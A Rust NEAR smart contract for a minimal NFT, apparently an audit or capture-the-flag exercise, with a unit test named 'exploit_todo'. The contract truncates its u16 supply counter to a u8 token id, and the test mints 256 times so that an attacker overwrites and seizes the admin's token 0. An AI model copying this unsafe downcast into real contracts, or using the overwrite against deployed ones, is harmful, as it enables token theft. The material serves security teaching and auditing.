use near_sdk::store::LookupMap;
use near_sdk::{env, near, require, AccountId};

pub type Id = u8;
//audit
// pub type Id = u16

#[near(contract_state)]
pub struct Contract {
    pub tokens: LookupMap<Id, AccountId>,
    pub approvals: LookupMap<Id, AccountId>,
    pub supply: u16,
}

impl Default for Contract {
    fn default() -> Self {
        Self {
            tokens: {
                let mut a = LookupMap::new(b"tokens".to_vec());
                a.insert(0, "admin.near".parse().unwrap());
                a
            },
            approvals: LookupMap::new(b"approvals".to_vec()),
            supply: 1,
        }
    }
}

#[near]
impl Contract {
    #[init]
    #[private] // only callable by the contract's account
    pub fn init(
        admin: AccountId
    ) -> Self {
        Self {
            tokens: {
                let mut a = LookupMap::new(b"tokens".to_vec());
                a.insert(0, admin);
                a
            },
            approvals: LookupMap::new(b"approvals".to_vec()),
            supply: 1,
        }
    }

    pub fn owner_of(&self, id: Id) -> Option<AccountId> {
        self.tokens.get(&id).cloned()
    }

    pub fn mint(&mut self) -> Id {
       // env::log_str(&format!(" self supply for le bytes {}",self.supply.to_le_bytes()[0]));
        self.tokens.insert(self.supply.to_le_bytes()[0], env::predecessor_account_id());
        
        let id = self.supply;
        self.supply += 1;
        id as Id
    }

    // unable to approve or tranfer id> 255
    pub fn approve(&mut self, id: Id, delegatee: AccountId) {
        require!(self.tokens.get(&id).unwrap().clone() == env::predecessor_account_id(), "not owner!");
        self.approvals.insert(id, delegatee);
    }

    pub fn transfer(&mut self, id: Id, receiver: AccountId) {
        require!(
            self.tokens.get(&id).unwrap().clone() == env::predecessor_account_id()
            || self.approvals.get(&id).unwrap().clone() == env::predecessor_account_id()
            , "not owner!"
        );
        self.tokens.insert(id, receiver);
    }
}

#[cfg(test)]
mod tests {
    use near_sdk::{test_utils::VMContextBuilder, testing_env};
    use super::*;

    #[test]
    fn exploit_todo() {
       
        let bob: AccountId = "bob.near".parse().unwrap();
       
        
        // init
        let admin: AccountId = "admin.near".parse().unwrap();
        let mut contract = Contract::init(admin.clone());
        assert_eq!(contract.owner_of(0).unwrap(), admin);
        contract.mint();
        
        // assert true alice is owner of nft id 1 
        

        set_context(bob.clone());
        // now mint 256 times
        for n in 0..255 {
            contract.mint();
            
        }
        // Due to unsafe downcasting of u16: supply to u8:id
        
        assert_eq!(bob, contract.owner_of(0).unwrap());
        assert_eq!(None, contract.owner_of(255));
        // let logs = near_sdk::test_utils::get_logs();
        
        // for log in logs {
        //     println!("Log: {}", log);
        // }
        
    }

    // Auxiliar fn: create a mock context
    fn set_context(predecessor: AccountId) {
        let mut builder = VMContextBuilder::new();
        builder.predecessor_account_id(predecessor);

        testing_env!(builder.build());
    }

}